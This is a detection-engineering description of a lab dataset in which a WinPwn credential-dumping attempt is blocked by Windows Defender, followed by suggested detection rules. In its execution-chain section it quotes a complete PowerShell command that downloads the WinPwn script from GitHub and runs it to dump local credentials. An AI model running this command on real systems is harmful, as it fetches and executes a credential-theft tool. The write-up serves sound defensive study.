# T1078.003-6: Local Accounts — WinPwn - Loot local Credentials - powerhell kittie

## Technique Context

T1078.003 - Valid Accounts: Local Accounts involves adversaries using legitimate local accounts to maintain access and move laterally within networks. Attackers often abuse local accounts after initial compromise to blend in with normal user activity, escalate privileges, or persist in environments. The WinPwn framework's "obfuskittiedump" function is designed to extract local credentials from memory, particularly targeting tools like Mimikatz for credential harvesting. Detection engineers focus on credential access patterns, suspicious PowerShell execution, and the loading of credential-dumping tools or techniques that access LSASS memory.

## What This Dataset Contains

This dataset captures a credential harvesting attempt using the WinPwn framework that was blocked by Windows Defender. The primary evidence includes:

**PowerShell Execution Chain**: Security event 4688 shows PowerShell spawning with the command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') obfuskittiedump -consoleoutput -noninteractive}`, clearly showing the attempt to download and execute the WinPwn credential dumping tool.

**Network Activity**: Sysmon EID 22 captures the DNS resolution for `raw.githubusercontent.com`, and EID 3 shows the subsequent HTTPS connection to `185.199.108.133:443` from the PowerShell process, demonstrating the download attempt.

**Defender Blocking**: PowerShell EID 4100 contains the critical evidence: `"This script contains malicious content and has been blocked by your antivirus software"` with error ID `ScriptContainedMaliciousContent`, indicating Windows Defender's AMSI successfully blocked the WinPwn script execution.

**Process Creation Events**: Sysmon EID 1 events show the PowerShell process chain and a `whoami.exe` execution (process 8032), likely for reconnaissance before the credential dumping attempt.

**Image Loading**: Multiple Sysmon EID 7 events show PowerShell loading .NET runtime components and Windows Defender DLLs (`MpOAV.dll`, `MpClient.dll`), indicating both the PowerShell execution environment and active endpoint protection.

## What This Dataset Does Not Contain

The dataset lacks the actual credential dumping telemetry because Windows Defender blocked the attack before completion. Missing elements include:

- No LSASS process access events (Sysmon EID 10 targeting LSASS)
- No file creation events for credential dumps or output files
- No registry access events for SAM/SECURITY hive interactions
- No additional suspicious process creations that would occur during successful credential extraction
- Limited PowerShell script block content due to the early blocking by AMSI

The Sysmon configuration's include-mode filtering for ProcessCreate events explains why some expected process creations might not appear, though the critical PowerShell processes are captured.

## Assessment

This dataset provides excellent telemetry for detection engineering focused on blocked credential harvesting attempts. The combination of command-line logging, PowerShell logging, and network telemetry creates a comprehensive view of the attack attempt. The Windows Defender blocking provides a realistic scenario showing how modern endpoint protection interacts with credential dumping tools. While the attack was prevented, the pre-blocking telemetry is sufficient to build detection rules for similar WinPwn or credential harvesting frameworks. The dataset would be stronger with successful execution telemetry for comparison, but the blocked attempt still provides valuable detection opportunities.

## Detection Opportunities Present in This Data

1. **Malicious PowerShell Download Pattern**: Detect PowerShell processes with command lines containing `downloadstring` combined with GitHub raw URLs, especially when targeting security tool repositories.

2. **WinPwn Framework Indicators**: Alert on PowerShell command lines containing "obfuskittiedump", "WinPwn", or S3cur3Th1sSh1t repository references.

3. **AMSI Blocking Events**: Monitor PowerShell EID 4100 events with error ID "ScriptContainedMaliciousContent" as high-confidence malicious activity indicators.

4. **Suspicious Network + PowerShell Correlation**: Create rules correlating PowerShell network connections to raw.githubusercontent.com with subsequent script execution attempts.

5. **Process Chain Analysis**: Detect PowerShell parent-child relationships where child processes attempt credential-related activities (like `whoami` reconnaissance).

6. **Defense Evasion Attempts**: Monitor for PowerShell execution policy bypass attempts (`Set-ExecutionPolicy Bypass`) in conjunction with network download activities.

7. **Behavioral Sequence Detection**: Build rules identifying the sequence of DNS resolution → HTTPS download → PowerShell script block creation → AMSI blocking as a complete attack pattern.

8. **GitHub Security Tool Downloads**: Flag any PowerShell network activity targeting known offensive security repositories, particularly those hosting credential dumping tools.
